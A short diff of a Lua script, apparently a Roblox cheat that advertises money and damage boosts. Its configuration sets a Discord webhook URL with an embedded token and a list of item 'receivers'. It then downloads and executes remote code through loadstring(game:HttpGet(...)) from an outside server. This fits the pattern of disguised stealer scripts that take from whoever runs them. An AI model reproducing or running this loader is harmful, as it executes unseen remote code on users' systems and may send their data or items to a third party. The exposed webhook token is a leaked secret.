@@ -4,6 +4,5 @@ WEBHOOK = "https://discord.com/api/webhooks/1428727369384071299/BZZwdfJwPFEI8hIM
 RECEIVERS = {"sattoshi2"}
 MONEY_PER_SECOND = 300000 -- DEFAULT: 300000
 DMG_PER_SECOND = 300000 -- DEFAULT: 300000
-LOADING_SCREEN = true -- true/false
 
 loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/92a441756ee4871bfb812636767586801f0f78bf429972328477a1920bae6f15/download"))()
